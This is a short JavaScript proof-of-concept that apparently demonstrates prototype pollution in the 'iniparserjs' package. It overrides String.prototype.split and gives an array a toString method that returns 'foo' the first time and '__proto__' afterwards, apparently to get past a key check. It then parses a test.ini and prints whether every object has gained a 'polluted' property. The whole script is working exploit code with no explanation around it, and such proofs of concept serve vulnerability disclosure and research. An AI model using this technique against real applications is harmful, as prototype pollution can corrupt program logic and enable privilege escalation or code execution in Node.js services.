var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
console.log({}.polluted);
var path = require('path');
var IniParser = require('iniparserjs');
var config = new IniParser(path.join(__dirname, 'test.ini'), 'UTF8');
console.log({}.polluted);